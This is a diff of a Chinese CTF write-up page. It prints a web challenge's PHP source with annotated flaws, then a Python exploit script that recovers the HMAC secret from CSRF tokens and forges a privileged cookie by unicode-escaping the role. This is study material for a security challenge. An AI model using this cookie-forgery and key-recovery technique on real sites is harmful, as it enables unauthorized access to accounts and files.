-<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
-    <span class="n">output</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;python&#39;</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
-    <span class="k">if</span> <span class="n">output</span><span class="p">:</span>
-        <span class="k">print</span> <span class="n">output</span>
-        <span class="k">break</span></code></pre></div>
+while 1:
+    output = subprocess.check_output(['python',sys.argv[1],sys.argv[2]])
+    if output:
+        print output
+        break</code></pre>
+</div>
 
 <p>运行得到如下输出：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py flag
-<span class="o">[</span>+<span class="o">]</span>Done!
+<div>
+  <pre><code class="bash">$ python get-1.py new-1.py flag
+[+]Done!
     &lt;!DOCTYPE html&gt;
-    &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
+    &lt;html lang=&quot;en&quot;&gt;
     &lt;head&gt;
-        &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
+        &lt;meta charset=&quot;UTF-8&quot;&gt;
         &lt;title&gt;Error&lt;/title&gt;
-        &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&quot;stylesheet&quot;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;style.css&quot;</span>&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;
         &lt;!-- ?x_show_source --&gt;
     &lt;/head&gt;
     &lt;body&gt;  
 
-    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
-        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block title&quot;</span>&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;block title&quot;&gt;
             Error
         &lt;/div&gt;
-        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block show&quot;</span>&gt;
+        &lt;div class=&quot;block show&quot;&gt;
             Function not found!!        &lt;/div&gt;
-        &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&quot;block info&quot;</span>&gt;
-            &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;javascript:history.back(-1)&quot;</span>&gt;返回&lt;/a&gt;
+        &lt;div class=&quot;block info&quot;&gt;
+            &lt;a href=&quot;javascript:history.back(-1)&quot;&gt;返回&lt;/a&gt;
         &lt;/div&gt;
     &lt;/div&gt;  
 
     &lt;/body&gt;
-    &lt;/html&gt;</code></pre></div>
+    &lt;/html&gt;</code></pre>
+</div>
 
 <p>显然我这样瞎猜函数不会是个头，那就必须知道flag.php中是否有函数可供我们利用呢，所以我们就得知道哪些函数可以查看当前脚本中定义的函数，变量，常量等信息，百度一下你就知道：<a href="http://www.jb51.net/article/42890.htm">PHP输出当前进程所有变量/常量/模块/函数/类的示例</a>，正好还都是不需要参数的。我首先利用get_defined_vars()和get_defined_constants()看看能不能直接脱出flag变量或者常量，然而并没有我想象的那么简单。那就用get_defined_functions看看吧：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
-<span class="o">[</span>+<span class="o">]</span>Done!
+<div>
+  <pre><code class="bash">$ python get-1.py new-1.py get_defined_functions
+[+]Done!
 &lt;br /&gt;
 &lt;b&gt;Notice&lt;/b&gt;:  Array to string conversion in &lt;b&gt;/app/index.php&lt;/b&gt; on line &lt;b&gt;45&lt;/b&gt;&lt;br /&gt;
-Array</code></pre></div>
+Array</code></pre>
+</div>
 
 <p>这里函数的结果是个数组，而strval()对数组的变换同一是”Array”。那就试试让其用json响应呗，根据<a href="http://stackoverflow.com/questions/28610376/sending-an-jquery-ajax-get-request-with-python-request-library">stackoverflow</a>上大神的回答，我们加个<code>'X-Requested-With': 'XMLHttpRequest'</code>的header就好了，输出如下（有省略）：</p>
 
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python get-1.py new-1.py get_defined_functions
-<span class="o">[</span>+<span class="o">]</span>Done!
-<span class="o">{</span><span class="s2">&quot;internal&quot;</span>:<span class="o">[</span><span class="s2">&quot;zend_version&quot;</span>,...<span class="o">]</span>,<span class="s2">&quot;user&quot;</span>:<span class="o">[</span><span class="s2">&quot;rand_str&quot;</span>,<span class="s2">&quot;output&quot;</span>,<span class="s2">&quot;check_csrf_token&quot;</span>,<span class="s2">&quot;show_form_page&quot;</span>,<span class="s2">&quot;show_error_page&quot;</span>,<span class="s2">&quot;_fd_init&quot;</span>,<span class="s2">&quot;fd_show_source&quot;</span>,<span class="s2">&quot;fd_config&quot;</span>,<span class="s2">&quot;fd_error&quot;</span>,<span class="s2">&quot;fg_safebox&quot;</span><span class="o">]}</span></code></pre></div>
+<div>
+  <pre><code class="bash">$ python get-1.py new-1.py get_defined_functions
+[+]Done!
+{&quot;internal&quot;:[&quot;zend_version&quot;,...],&quot;user&quot;:[&quot;rand_str&quot;,&quot;output&quot;,&quot;check_csrf_token&quot;,&quot;show_form_page&quot;,&quot;show_error_page&quot;,&quot;_fd_init&quot;,&quot;fd_show_source&quot;,&quot;fd_config&quot;,&quot;fd_error&quot;,&quot;fg_safebox&quot;]}</code></pre>
+</div>
 
 <p>主要关注的是最后一个数组中用户定义的函数，哎呦，有个fd_show_source的函数，试试没准flag就出来了。</p>
 
@@ -332,115 +348,117 @@ Array</code></pre></div>
 
 <p>事情并没有我们想象的那么简单，看来是作者又给我们下了一个套，fd_show_source函数输出整理如下（已加个人注解）：</p>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-<span class="sd">/**</span>
-<span class="sd"> * Created by PhpStorm.</span>
-<span class="sd"> * User: phithon</span>
-<span class="sd"> * Date: 16/6/8</span>
-<span class="sd"> * Time: 上午12:24</span>
-<span class="sd"> */</span> 
+<div>
+  <pre><code class="php">&lt;?php
+/**
+ * Created by PhpStorm.
+ * User: phithon
+ * Date: 16/6/8
+ * Time: 上午12:24
+ */ 
 
-<span class="k">class</span> <span class="nc">SafeBox</span> <span class="p">{</span> 
+class SafeBox { 
 
-    <span class="c1">//貌似可产生任意文件读取</span>
-    <span class="k">private</span> <span class="k">function</span> <span class="nf">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
-        <span class="k">return</span> <span class="nb">file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
-    <span class="p">}</span>   
+    //貌似可产生任意文件读取
+    private function _read_file($filename)
+    {
+        $filename = dirname(__FILE__) . &quot;/&quot; . $filename;
+        return file($filename);
+    }   
 
-    <span class="c1">//通过POST filename可读取任意文件</span>
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">read</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;box.txt&quot;</span><span class="p">;</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
-    <span class="p">}</span>   
+    //通过POST filename可读取任意文件
+    public function read()
+    {
+        $filename = isset($_POST['filename']) ? $_POST['filename'] : &quot;box.txt&quot;;
+        return $this-&gt;_read_file($filename);
+    }   
 
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">view</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
-        <span class="nv">$i</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;i&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;i&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
-        <span class="k">return</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$lines</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;None&quot;</span><span class="p">;</span>
-    <span class="p">}</span>   
+    public function view()
+    {
+        $lines = $this-&gt;_read_file('box.txt');
+        $i = isset($_POST['i']) ? intval($_POST['i']) : 0;
+        return isset($lines[$i]) ? $lines[$i] : &quot;None&quot;;
+    }   
 
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">alist</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$lines</span><span class="p">;</span>
-    <span class="p">}</span>   
+    public function alist()
+    {
+        $lines = $this-&gt;_read_file('box.txt');
+        return $lines;
+    }   
 
-    <span class="k">public</span> <span class="k">function</span> <span class="nf">random</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="nv">$lines</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_read_file</span><span class="p">(</span><span class="s1">&#39;box.txt&#39;</span><span class="p">);</span>
-        <span class="k">return</span> <span class="nv">$lines</span><span class="p">[</span><span class="nb">array_rand</span><span class="p">(</span><span class="nv">$lines</span><span class="p">)];</span>
-    <span class="p">}</span>
-<span class="p">}</span>   
+    public function random()
+    {
+        $lines = $this-&gt;_read_file('box.txt');
+        return $lines[array_rand($lines)];
+    }
+}   
 
-<span class="k">function</span> <span class="nf">_fd_init</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="c1">//定义role必须为guest</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span>
-        <span class="s2">&quot;role&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;guest&quot;</span>
-    <span class="p">];</span>                                                                                  <span class="c1">//初始化role为guest</span>
-    <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;userinfo&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;userinfo&#39;</span><span class="p">])</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>   <span class="c1">//base64解码cookie userinfo</span>
-    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">||</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>   
+function _fd_init()
+{
+    //定义role必须为guest
+    $_SESSION[&quot;userinfo&quot;] = [
+        &quot;role&quot; =&gt; &quot;guest&quot;
+    ];                                                                                  //初始化role为guest
+    $cookie = isset($_COOKIE['userinfo']) ? base64_decode($_COOKIE['userinfo']) : &quot;&quot;;   //base64解码cookie userinfo
+    if(empty($cookie) || strlen($cookie) &lt; 32) {
+        return false;
+    }   
 
-    <span class="nv">$h1</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                       <span class="c1">//前32位为h1</span>
-    <span class="nv">$h2</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>                                                          <span class="c1">//后32位为h2</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$h1</span> <span class="o">!==</span> <span class="nb">hash_hmac</span><span class="p">(</span><span class="s2">&quot;md5&quot;</span><span class="p">,</span> <span class="nv">$h2</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]))</span> <span class="p">{</span>                        <span class="c1">//再次hamc_md5校验(1)</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>   
+    $h1 = substr($cookie, 0, 32);                                                       //前32位为h1
+    $h2 = substr($cookie, 32);                                                          //后32位为h2
+    if($h1 !== hash_hmac(&quot;md5&quot;, $h2, $_SESSION['SECRET_KEY'])) {                        //再次hamc_md5校验(1)
+        return false;
+    }   
 
-    <span class="c1">//防止身份伪造</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span> <span class="o">||</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//防止h2中出现&quot;admin&quot;和&quot;user&quot;(2)</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="nv">$s</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$h2</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>                                                        <span class="c1">//json解码h2，并转换成数组</span>
-    <span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strval</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]);</span>                                                    <span class="c1">//$s[&#39;role&#39;]转为字符串(3)</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="p">{</span>                                                         <span class="c1">//再次进行身份对比</span>
-        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">],</span> <span class="nv">$s</span><span class="p">);</span>                     <span class="c1">//用h2中的role替换session中userinfo的role</span>
-    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
-<span class="p">}</span>   
+    //防止身份伪造
+    if(strpos($h2, &quot;admin&quot;) !== false || strpos($h2, &quot;user&quot;) !== false) {               //防止h2中出现&quot;admin&quot;和&quot;user&quot;(2)
+        return false;
+    }
+    $s = json_decode($h2, true);                                                        //json解码h2，并转换成数组
+    $s['role'] = strval($s['role']);                                                    //$s['role']转为字符串(3)
+    if($s['role'] == 'admin') {                                                         //再次进行身份对比
+        return false;
+    }
+    $_SESSION[&quot;userinfo&quot;] = array_merge($_SESSION[&quot;userinfo&quot;], $s);                     //用h2中的role替换session中userinfo的role
+    return true;
+}   
 
-<span class="k">function</span> <span class="nf">fd_show_source</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
-<span class="p">}</span>   
+function fd_show_source()
+{
+    return file_get_contents(__FILE__);
+}   
 
-<span class="c1">//包含config.php 其中可能有flag？</span>
-<span class="k">function</span> <span class="nf">fd_config</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="k">include_once</span> <span class="nx">__DIR__</span> <span class="o">.</span> <span class="s2">&quot;/config.php&quot;</span><span class="p">;</span>
-<span class="p">}</span>   
+//包含config.php 其中可能有flag？
+function fd_config()
+{
+    return include_once __DIR__ . &quot;/config.php&quot;;
+}   
 
-<span class="k">function</span> <span class="nf">fd_error</span><span class="p">(</span><span class="nv">$msg</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="s2">&quot;Error: </span><span class="si">{</span><span class="nv">$msg</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">;</span>
-<span class="p">}</span>   
+function fd_error($msg)
+{
+    return &quot;Error: {$msg}&quot;;
+}   
 
-<span class="k">function</span> <span class="nf">fg_safebox</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nx">_fd_init</span><span class="p">();</span>                                                                         <span class="c1">//初始化</span>
-    <span class="nv">$config</span> <span class="o">=</span> <span class="nx">fd_config</span><span class="p">();</span>
-    <span class="nv">$action</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>                          <span class="c1">//指定action</span>
-    <span class="nv">$role</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;userinfo&quot;</span><span class="p">][</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
-    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$role</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span>                                           <span class="c1">//判断是否具有权限(1)</span>
-        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">&#39;Permission denied!!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$action</span><span class="p">,</span> <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">][</span><span class="s1">&#39;admin&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$role</span> <span class="o">!=</span> <span class="s2">&quot;admin&quot;</span><span class="p">)</span> <span class="p">{</span>               <span class="c1">//判读行为权限(2)</span>
-        <span class="k">return</span> <span class="nx">fd_error</span><span class="p">(</span><span class="s1">&#39;Admin permission denied!!&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nv">$box</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SafeBox</span><span class="p">();</span>
-    <span class="k">if</span><span class="p">(</span><span class="nb">method_exists</span><span class="p">(</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">))</span> <span class="p">{</span>                                                  <span class="c1">//判断对象方法是否存在(3)</span>
-        <span class="k">return</span> <span class="nb">call_user_func</span><span class="p">([</span><span class="nv">$box</span><span class="p">,</span> <span class="nv">$action</span><span class="p">]);</span>                                         <span class="c1">//调用相应方法(4)</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span></code></pre></div>
+function fg_safebox()
+{
+    _fd_init();                                                                         //初始化
+    $config = fd_config();
+    $action = isset($_POST['method']) ? $_POST['method'] : &quot;&quot;;                          //指定action
+    $role = isset($_SESSION[&quot;userinfo&quot;]['role']) ? $_SESSION[&quot;userinfo&quot;]['role'] : &quot;&quot;;
+    if(!in_array($role, ['admin', 'user'])) {                                           //判断是否具有权限(1)
+        return fd_error('Permission denied!!');
+    }
+    if(in_array($action, $config['role']['admin']) &amp;&amp; $role != &quot;admin&quot;) {               //判读行为权限(2)
+        return fd_error('Admin permission denied!!');
+    }
+    $box = new SafeBox();
+    if(method_exists($box, $action)) {                                                  //判断对象方法是否存在(3)
+        return call_user_func([$box, $action]);                                         //调用相应方法(4)
+    } else {
+        return null;
+    }
+}</code></pre>
+</div>
 
 <p>首先在初始化_fd_init()中，要点分析如下：</p>
 
@@ -454,82 +472,88 @@ Array</code></pre></div>
 
 <p>在(2)判读行为权限中，加入$box对象的read方法不在$config[‘role’][‘admin’]数组内，那么就不会判断<code>$role != "admin"</code>，进而产生绕过。我们再修改一下原先的代码（new-2.py）如下：</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">re</span>
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">hmac</span>
-<span class="kn">import</span> <span class="nn">base64</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span> 
+<div>
+  <pre><code class="python">import re
+import requests
+import hmac
+import base64
+import sys
+reload(sys)
+sys.setdefaultencoding('utf-8') 
 
-<span class="n">url</span> <span class="o">=</span> <span class="s">&quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;</span>
-<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
-<span class="n">str_list</span> <span class="o">=</span> <span class="s">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>
-<span class="n">re_csrf_token</span> <span class="o">=</span> <span class="s">r&#39;(?&lt;=value=&quot;).*?(?=&quot;)&#39;</span>
-<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;X-Requested-With&#39;</span><span class="p">:</span> <span class="s">&#39;XMLHttpRequest&#39;</span><span class="p">}</span>
-<span class="n">action</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">method</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>    
+url = &quot;http://0dac0a717c3cf340e.jie.sangebaimao.com:82/&quot;
+session = requests.session()
+str_list = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+re_csrf_token = r'(?&lt;=value=&quot;).*?(?=&quot;)'
+header = {'X-Requested-With': 'XMLHttpRequest'}
+action = sys.argv[1]
+method = sys.argv[2]    
 
-<span class="k">def</span> <span class="nf">parse</span><span class="p">(</span><span class="n">token</span><span class="p">,</span><span class="n">s</span><span class="p">):</span>
-    <span class="n">d</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">token</span><span class="p">)):</span>
-        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
-            <span class="k">if</span> <span class="n">token</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
-                <span class="n">d</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
-                <span class="k">break</span>
-    <span class="k">return</span> <span class="n">d</span>    
+def parse(token,s):
+    d = []
+    for i in xrange(len(token)):
+        for j in xrange(len(s)):
+            if token[i] == s[j]:
+                d.append(j)
+                break
+    return d    
 
-<span class="k">def</span> <span class="nf">guess</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="n">s</span><span class="p">,</span><span class="n">a</span><span class="p">):</span>
-    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
-        <span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="mi">31</span><span class="o">+</span><span class="n">i</span><span class="p">]</span><span class="o">+</span><span class="mi">62</span><span class="o">-</span><span class="n">d</span><span class="p">[</span><span class="mi">28</span><span class="o">+</span><span class="n">i</span><span class="p">])</span><span class="o">%</span><span class="mi">62</span>
-        <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-    <span class="n">key</span> <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="p">)</span> 
+def guess(d,s,a):
+    result = []
+    for i in xrange(6):
+        r = (d[31+i]+62-d[28+i])%62
+        result.append(r)
+    key = ''.join(s[j] for j in result) 
 
-    <span class="k">return</span> <span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">a</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>    
+    return (key,hmac.new(key,a).hexdigest())    
 
-<span class="k">def</span> <span class="nf">create_cookie</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
-    <span class="n">h2</span> <span class="o">=</span> <span class="s">r&#39;{&quot;role&quot;:&quot;\u0075\u0073\u0065\u0072&quot;}&#39;</span>
-    <span class="n">h1</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span><span class="n">h2</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
-    <span class="k">return</span> <span class="p">{</span><span class="s">&#39;userinfo&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">h1</span><span class="o">+</span><span class="n">h2</span><span class="p">)}</span> 
+def create_cookie(k):
+    h2 = r'{&quot;role&quot;:&quot;\u0075\u0073\u0065\u0072&quot;}'
+    h1 = hmac.new(k,h2).hexdigest()
+    return {'userinfo':base64.b64encode(h1+h2)} 
 
-<span class="n">r0</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="n">token0</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r0</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">d0</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token0</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
-<span class="n">payload0</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;submit&#39;</span><span class="p">:</span><span class="s">&#39;go&#39;</span><span class="p">,</span> <span class="s">&#39;CSRF_TOKEN&#39;</span><span class="p">:</span><span class="n">token0</span><span class="p">,</span> <span class="s">&#39;act&#39;</span><span class="p">:</span><span class="n">action</span><span class="p">,</span> <span class="s">&#39;key&#39;</span><span class="p">:</span><span class="s">&#39;1234567&#39;</span><span class="p">}</span>
-<span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload0</span><span class="p">)</span>
-<span class="n">r1</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-<span class="n">token1</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">re_csrf_token</span><span class="p">,</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">d1</span> <span class="o">=</span> <span class="n">parse</span><span class="p">(</span><span class="n">token1</span><span class="p">,</span><span class="n">str_list</span><span class="p">)</span>
